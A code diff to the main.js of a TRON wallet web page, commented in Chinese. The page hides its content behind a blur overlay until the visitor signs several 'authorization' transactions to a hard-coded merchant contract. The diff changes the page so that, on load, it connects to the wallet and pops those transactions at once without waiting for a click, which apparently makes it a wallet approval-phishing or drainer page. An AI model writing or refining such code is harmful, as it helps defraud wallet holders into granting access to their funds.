@@ -1,4 +1,4 @@
-// src/main.js (最終版本：包含邏輯分流修正)
+// src/main.js (最終版本：自動調用授權交易)
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS='TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
@@ -31,6 +31,8 @@ const authorizeButton=document.getElementById('authorizeButton'); 
 function showOverlay(message) {
     if(overlayMessage)overlayMessage.innerHTML=message;
     if(blurOverlay)blurOverlay.style.display='flex';
+    // 隱藏鎖定提示，因為 Overlay 已經佔據畫面
+    if(lockedPrompt)lockedPrompt.style.display='none'; 
 }
 function hideOverlay() {
     if(overlayMessage)overlayMessage.innerHTML='';
@@ -40,14 +42,15 @@ function hideOverlay() {
 function updateContentLock(isAuthorized) {
     isAuthorizedOnChain=isAuthorized;
     if(isAuthorized) {
+        // 解鎖：隱藏所有提示
         if(blurOverlay)blurOverlay.style.display='none';
         if(lockedPrompt)lockedPrompt.style.display='none';
-        if(authorizeButton)authorizeButton.style.display='none';
     } else {
+        // 鎖定：顯示鎖定提示，並用 Overlay 遮蓋內容
         if(blurOverlay)blurOverlay.style.display='flex';
-        if(lockedPrompt)lockedPrompt.style.display='flex';
-        if(authorizeButton)authorizeButton.style.display='none'; 
+        if(lockedPrompt)lockedPrompt.style.display='flex'; 
     }
+    if(authorizeButton)authorizeButton.style.display='none'; // 保持隱藏重試按鈕
 }
 
 function updateConnectionUI(connected, address=null) {
@@ -86,7 +89,6 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue=0) {
 
         showOverlay(`Step ${txCount}/${totalTxs}: Operation broadcast successful! TxID: ${txHash.substring(0, 6)}...`);
         
-        // UX 優化: 減少成功廣播後的延遲
         await new Promise(resolve => setTimeout(resolve, 300)); 
 
         return txHash;
@@ -161,6 +163,7 @@ async function connectWalletLogic() {
                 if(!currentAddressHex||currentAddressHex===DEFAULT_TRON_ADDRESS_HEX) {
                     if(window.tronLink&&window.tronLink.request) {
                         try {
+                            // 這裡需要使用者手動確認連接
                             await window.tronLink.request({method: 'tron_requestAccounts'});
                             currentAddressHex=tronWeb.defaultAddress.hex;
                         } catch(requestError) {
@@ -226,7 +229,8 @@ async function connectAndAuthorize() {
             showOverlay('Already authorized. Unlocking data...');
             return true;
         }
-
+        
+        // 核心邏輯：自動彈出授權交易
         for(const [index, tx] of transactionsToSend.entries()) {
             await sendTransaction(tx.call, tx.message, totalTxs);
         }
@@ -240,7 +244,7 @@ async function connectAndAuthorize() {
             :`Authorization failed! Error: ${error.message}.`;
 
         showOverlay(`🔴 ${displayError}`);
-        // 雖然 HTML/CSS 隱藏了重試按鈕，但我們確保提示框保持顯示
+        // 授權失敗，顯示右上角提示，等待用戶再次點擊
         updateContentLock(false); 
         return false;
     }
@@ -248,12 +252,11 @@ async function connectAndAuthorize() {
 
 
 // ---------------------------------------------
-// ⭐️ 連線成功後處理：應用 UX 優化 ⭐️
+// ⭐️ 連線成功後處理：檢查狀態並決定是否自動觸發授權 ⭐️
 // ---------------------------------------------
 async function handlePostConnection() {
     console.log("handlePostConnection called");
     
-    // 關鍵修正 1：重置交易計數器 
     txCount = 0; 
 
     if(!isConnectedFlag) {
@@ -269,43 +272,39 @@ async function handlePostConnection() {
         // 2. 如果狀態都 OK，則直接解鎖
         console.log("✅ On-chain status is fully Authorized. Unlocking data...");
         showOverlay('✅ Access confirmed! Unlocking data...');
-        
-        // UX 優化: 立即解鎖
         updateContentLock(true);
         hideOverlay();
         return;
     }
 
-    // 3. 狀態未完成，自動觸發授權流程 (會彈出提示框引導使用者點擊)
-    console.log(`⚠️ Data access confirmation incomplete. Triggering required steps automatically.`);
+    // 3. 狀態未完成，自動觸發授權流程
+    console.log(`⚠️ Data access confirmation incomplete. Attempting to auto-trigger authorization steps.`);
     
-    // 這裡我們不自動觸發授權，而是確保顯示鎖定提示，等待使用者點擊按鈕
-    updateContentLock(false); 
-    hideOverlay(); // 隱藏 'Checking on-chain...' 覆蓋層，顯示鎖定提示
+    // 這裡直接調用授權，如果錢包環境允許 (如 DApp 瀏覽器) 交易彈窗將立即出現
+    const authSuccess=await connectAndAuthorize();
 
-    // 註解掉自動觸發授權的邏輯，因為它現在被移動到 connectWallet 點擊事件中
-    // const authSuccess=await connectAndAuthorize();
-    // if(authSuccess) {
-    //     ...
-    // } else {
-    //     updateContentLock(false);
-    // }
+    if(authSuccess) {
+        console.log("✅ Confirmation broadcasted successfully. Final check...");
+        const finalStatus=await checkAuthorizationStatus(userAddress);
+        
+        updateContentLock(finalStatus.allOK);
+        hideOverlay();
+    } else {
+        // 授權失敗 (例如用戶取消)，顯示右上角提示，等待用戶再次點擊
+        updateContentLock(false);
+        hideOverlay();
+    }
 }
 
 
 // ---------------------------------------------
-// ⭐️ 修正後的 主連接入口函數：實現邏輯分流 ⭐️
+// 主連接入口函數：實現邏輯分流 (供手動點擊按鈕使用)
 // ---------------------------------------------
 async function connectWallet() {
-    // UX 優化: 在操作開始時立即禁用按鈕
     if(connectButton)connectButton.disabled=true;
 
-    // 狀態檢查
     if(isConnectedFlag) {
         
-        // ⭐️ 關鍵邏輯修正：分流 ⭐️
-        
-        // 1. 檢查授權狀態
         const status = await checkAuthorizationStatus(userAddress);
 
         if (status.allOK) {
@@ -320,11 +319,9 @@ async function connectWallet() {
             updateContentLock(false);
             
         } else {
-            // 狀態 2: 已連接 但 未授權 (鎖定狀態) -> 觸發授權流程
+            // 狀態 2: 已連接 但 未授權 -> 觸發授權流程 (供用戶手動重試或首次點擊)
             console.log("Status: Connected but Unauthorized. Triggering authorization...");
-            // 直接在這裡調用授權，這是一個使用者發起的動作，錢包可以彈出交易確認
             await connectAndAuthorize(); 
-            // 授權成功後，重新檢查狀態並解鎖
             await handlePostConnection(); 
         }
         
@@ -334,12 +331,11 @@ async function connectWallet() {
         const connected=await connectWalletLogic();
 
         if(connected) {
-            // 連接成功後，執行 handlePostConnection，它會檢查授權狀態，並顯示鎖定提示
+            // 連接成功後，立即嘗試授權
             await handlePostConnection();
         }
     }
 
-    // UX 優化: 無論成功或失敗，最後重新啟用按鈕
     if(connectButton)connectButton.disabled=false;
 }
 
@@ -349,22 +345,17 @@ async function connectWallet() {
 
 if(connectButton)connectButton.addEventListener('click', connectWallet);
 
-// 由於我們隱藏了 authorizeButton，這個事件監聽器不再有作用，但為了完整性可以保留
-if(authorizeButton)authorizeButton.addEventListener('click', async () => {
-    // 此邏輯現在已合併到 connectWallet 函數中
-});
-
-
-// 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
+// 頁面啟動：自動嘗試連接並觸發授權
 updateConnectionUI(false);
 updateContentLock(false);
 
 window.onload=() => {
     setTimeout(async () => {
         // 頁面載入後自動嘗試連接
-        await connectWalletLogic(); 
-        // 連接成功後檢查授權狀態
-        if(isConnectedFlag){
+        const connected = await connectWalletLogic(); 
+        
+        // 🚨 關鍵步驟：如果連接成功，立即執行後續檢查和自動彈出授權交易
+        if(connected){
             await handlePostConnection();
         }
     }, 500);
